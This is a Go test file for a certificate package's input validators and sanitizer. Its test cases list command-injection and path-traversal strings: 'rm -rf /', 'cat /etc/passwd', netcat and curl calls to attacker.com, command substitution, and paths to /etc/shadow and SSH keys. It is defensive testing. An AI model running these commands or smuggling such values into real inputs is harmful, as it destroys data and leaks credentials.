package crypto

import (
	"testing"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/testutil"
)

func TestInputValidationSecurity(t *testing.T) {
	t.Run("domain_validation_security", func(t *testing.T) {
		dangerousInputs := []struct {
			name   string
			domain string
			attack string
		}{
			{
				name:   "command_injection_semicolon",
				domain: "example.com; rm -rf /",
				attack: "command chaining",
			},
			{
				name:   "command_injection_ampersand",
				domain: "example.com && cat /etc/passwd",
				attack: "command execution",
			},
			{
				name:   "command_injection_pipe",
				domain: "example.com | nc attacker.com 4444",
				attack: "pipe to netcat",
			},
			{
				name:   "command_injection_backtick",
				domain: "example.com`id`",
				attack: "command substitution",
			},
			{
				name:   "command_injection_dollar",
				domain: "example.com$(whoami)",
				attack: "command substitution",
			},
			{
				name:   "path_traversal",
				domain: "../../../etc/passwd",
				attack: "path traversal",
			},
			{
				name:   "null_byte_injection",
				domain: "example.com\x00malicious",
				attack: "null byte injection",
			},
			{
				name:   "newline_injection",
				domain: "example.com\nmalicious",
				attack: "newline injection",
			},
			{
				name:   "space_injection",
				domain: "example.com -flag value",
				attack: "space injection",
			},
			{
				name:   "quote_injection",
				domain: "example.com\"malicious\"",
				attack: "quote injection",
			},
		}

		for _, tt := range dangerousInputs {
			t.Run(tt.name, func(t *testing.T) {
				err := ValidateDomainName(tt.domain)
				testutil.AssertError(t, err)
				t.Logf("✅ Successfully blocked %s attack: %s", tt.attack, tt.domain)
			})
		}
	})

	t.Run("email_validation_security", func(t *testing.T) {
		dangerousEmails := []struct {
			name   string
			email  string
			attack string
		}{
			{
				name:   "command_injection_email",
				email:  "user@domain.com; rm -rf /",
				attack: "command injection",
			},
			{
				name:   "quote_injection_email",
				email:  "user@domain.com\"malicious",
				attack: "quote injection",
			},
			{
				name:   "null_byte_email",
				email:  "user@domain.com\x00",
				attack: "null byte injection",
			},
			{
				name:   "newline_email",
				email:  "user@domain.com\nmalicious",
				attack: "newline injection",
			},
			{
				name:   "pipe_injection_email",
				email:  "user@domain.com | nc attacker.com",
				attack: "pipe injection",
			},
		}

		for _, tt := range dangerousEmails {
			t.Run(tt.name, func(t *testing.T) {
				err := ValidateEmailAddress(tt.email)
				testutil.AssertError(t, err)
				t.Logf("✅ Successfully blocked %s attack: %s", tt.attack, tt.email)
			})
		}
	})

	t.Run("app_name_validation_security", func(t *testing.T) {
		dangerousAppNames := []struct {
			name    string
			appName string
			attack  string
		}{
			{
				name:    "command_injection_app",
				appName: "app; rm -rf /",
				attack:  "command injection",
			},
			{
				name:    "reserved_name_admin",
				appName: "admin",
				attack:  "reserved name",
			},
			{
				name:    "reserved_name_root",
				appName: "root",
				attack:  "reserved name",
			},
			{
				name:    "path_traversal_app",
				appName: "../../../etc",
				attack:  "path traversal",
			},
			{
				name:    "space_injection_app",
				appName: "app name",
				attack:  "space injection",
			},
		}

		for _, tt := range dangerousAppNames {
			t.Run(tt.name, func(t *testing.T) {
				err := ValidateAppName(tt.appName)
				testutil.AssertError(t, err)
				t.Logf("✅ Successfully blocked %s attack: %s", tt.attack, tt.appName)
			})
		}
	})
}

func TestValidInputsAccepted(t *testing.T) {
	t.Run("valid_domains", func(t *testing.T) {
		validDomains := []string{
			"example.com",
			"sub.example.com",
			"my-app.domain.co.uk",
			"test123.example.org",
			"a.b",
		}

		for _, domain := range validDomains {
			t.Run("domain_"+domain, func(t *testing.T) {
				err := ValidateDomainName(domain)
				testutil.AssertNoError(t, err)
			})
		}
	})

	t.Run("valid_emails", func(t *testing.T) {
		validEmails := []string{
			"user@example.com",
			"test.user@domain.co.uk",
			"admin+test@example.org",
			"user123@sub.domain.com",
		}

		for _, email := range validEmails {
			t.Run("email_"+email, func(t *testing.T) {
				err := ValidateEmailAddress(email)
				testutil.AssertNoError(t, err)
			})
		}
	})

	t.Run("valid_app_names", func(t *testing.T) {
		validAppNames := []string{
			"myapp",
			"my-app",
			"app123",
			"test-application",
			"web",
		}

		for _, appName := range validAppNames {
			t.Run("app_"+appName, func(t *testing.T) {
				err := ValidateAppName(appName)
				testutil.AssertNoError(t, err)
			})
		}
	})
}

func TestCertificateInputValidationIntegration(t *testing.T) {
	t.Run("valid_certificate_inputs", func(t *testing.T) {
		err := ValidateAllCertificateInputs("myapp", "validcorp.com", "admin@validcorp.com")
		testutil.AssertNoError(t, err)
	})

	t.Run("malicious_certificate_inputs", func(t *testing.T) {
		maliciousTests := []struct {
			name    string
			appName string
			domain  string
			email   string
			attack  string
		}{
			{
				name:    "injection_in_app_name",
				appName: "app; rm -rf /",
				domain:  "example.com",
				email:   "admin@example.com",
				attack:  "command injection via app name",
			},
			{
				name:    "injection_in_domain",
				appName: "myapp",
				domain:  "example.com && cat /etc/passwd",
				email:   "admin@example.com",
				attack:  "command injection via domain",
			},
			{
				name:    "injection_in_email",
				appName: "myapp",
				domain:  "example.com",
				email:   "admin@example.com; curl attacker.com",
				attack:  "command injection via email",
			},
			{
				name:    "long_domain_construction",
				appName: "verylongapplicationnamethatexceedsnormallimits",
				domain:  "verylongdomainnamethatshouldcausetheconstructedfqdntoexceedmaximumlengthallowedbystandards.com",
				email:   "admin@example.com",
				attack:  "constructed FQDN length overflow",
			},
		}

		for _, tt := range maliciousTests {
			t.Run(tt.name, func(t *testing.T) {
				err := ValidateAllCertificateInputs(tt.appName, tt.domain, tt.email)
				testutil.AssertError(t, err)
				t.Logf("✅ Successfully blocked %s", tt.attack)
			})
		}
	})
}

func TestSanitizationSecurity(t *testing.T) {
	t.Run("sanitization_removes_dangerous_chars", func(t *testing.T) {
		dangerousInputs := []struct {
			name     string
			input    string
			expected string
		}{
			{
				name:     "remove_semicolon",
				input:    "test;malicious",
				expected: "testmalicious",
			},
			{
				name:     "remove_null_bytes",
				input:    "test\x00malicious",
				expected: "testmalicious",
			},
			{
				name:     "remove_quotes",
				input:    "test\"malicious'",
				expected: "testmalicious",
			},
			{
				name:     "preserve_valid_chars",
				input:    "my-app.example.com",
				expected: "my-app.example.com",
			},
			{
				name:     "preserve_email_format",
				input:    "user@domain.com",
				expected: "user@domain.com", // @ should be preserved
			},
		}

		for _, tt := range dangerousInputs {
			t.Run(tt.name, func(t *testing.T) {
				result := SanitizeInputForCommand(tt.input)
				testutil.AssertEqual(t, tt.expected, result)
			})
		}
	})
}

func TestFilePathValidationSecurity(t *testing.T) {
	t.Run("path_traversal_prevention", func(t *testing.T) {
		dangerousPaths := []string{
			"../../../etc/passwd",
			"./../../etc/shadow",
			"certs/../../../home/user/.ssh/id_rsa",
			"/etc/passwd",
			"certs/../../sensitive",
		}

		for _, path := range dangerousPaths {
			t.Run("dangerous_path_"+path, func(t *testing.T) {
				err := validateFilePath(path)
				testutil.AssertError(t, err)
				t.Logf("✅ Successfully blocked dangerous path: %s", path)
			})
		}
	})

	t.Run("valid_paths_accepted", func(t *testing.T) {
		validPaths := []string{
			"certs/example.com.pem",
			"certs/my-app.example.com.privkey.pem",
			"certificates/test.fullchain.pem",
		}

		for _, path := range validPaths {
			t.Run("valid_path_"+path, func(t *testing.T) {
				err := validateFilePath(path)
				testutil.AssertNoError(t, err)
			})
		}
	})
}

// Integration test for the full certificate generation function
func TestEnsureCertificatesSecurity(t *testing.T) {
	t.Run("reject_malicious_inputs", func(t *testing.T) {
		// Test that the function rejects malicious inputs at the validation stage
		err := EnsureCertificates("app; rm -rf /", "example.com", "admin@example.com")
		testutil.AssertError(t, err)
		testutil.AssertErrorContains(t, err, "validation failed")
	})

	t.Run("reject_invalid_domain", func(t *testing.T) {
		err := EnsureCertificates("myapp", "invalid..domain", "admin@example.com")
		testutil.AssertError(t, err)
		testutil.AssertErrorContains(t, err, "validation failed")
	})

	t.Run("reject_invalid_email", func(t *testing.T) {
		err := EnsureCertificates("myapp", "example.com", "invalid-email")
		testutil.AssertError(t, err)
		testutil.AssertErrorContains(t, err, "validation failed")
	})
}
